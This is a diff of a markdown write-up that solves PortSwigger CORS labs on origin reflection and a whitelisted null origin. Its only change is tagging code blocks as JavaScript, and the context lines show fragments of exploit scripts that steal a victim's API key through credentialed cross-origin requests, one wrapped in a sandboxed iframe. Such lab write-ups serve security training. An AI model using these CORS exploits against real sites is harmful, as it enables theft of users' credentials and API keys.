@@ -14,7 +14,7 @@ Reference: https://portswigger.net/web-security/cors/lab-basic-origin-reflection
 <!-- omit in toc -->
 ### Quick Solution
 An exploit can be crafted and delivered to the victim to get the ``apikey``. The solution uses the old ``XMLHttpRequest``. I used the ``fetch`` with the ``credentials: include`` header. Here is the full exploit:
-```
+```javascript
 <script>
 const exploit = async () => {
     const labBaseUrl = <base_lab_url>;
@@ -35,7 +35,7 @@ exploit()
 3. Send the request to Burp Repeater, and resubmit it with the added header: ``Origin: https://example.com``
 4. Observe that the origin is reflected in the ``Access-Control-Allow-Origin`` header.
 5. In your browser, go to the exploit server and enter the following HTML, replacing ``$url`` with your unique lab URL:
-```
+```javascript
 <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
@@ -58,7 +58,7 @@ Reference: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted
 <!-- omit in toc -->
 ### Quick Solution
 In this case the ``null`` Origin value is **whitelisted**. Browsers might send the value ``null`` in the Origin header in various unusual situations, **Sandboxed cross-origin requests** is one of them. So we can reuse the previous exploit and wrap it inside a sandboxed iframe:
-```
+```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
     <script>
         const exploit = async () => {
@@ -81,7 +81,7 @@ In this case the ``null`` Origin value is **whitelisted**. Browsers might send t
 3. Send the request to Burp Repeater, and resubmit it with the added header ``Origin: null.``
 4. Observe that the "null" origin is reflected in the ``Access-Control-Allow-Origin`` header.
 5. In your browser, go to the exploit server and enter the following HTML, replacing $url with the URL for your unique lab URL and ``$exploit-server-url`` with the exploit server URL
-```
+```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
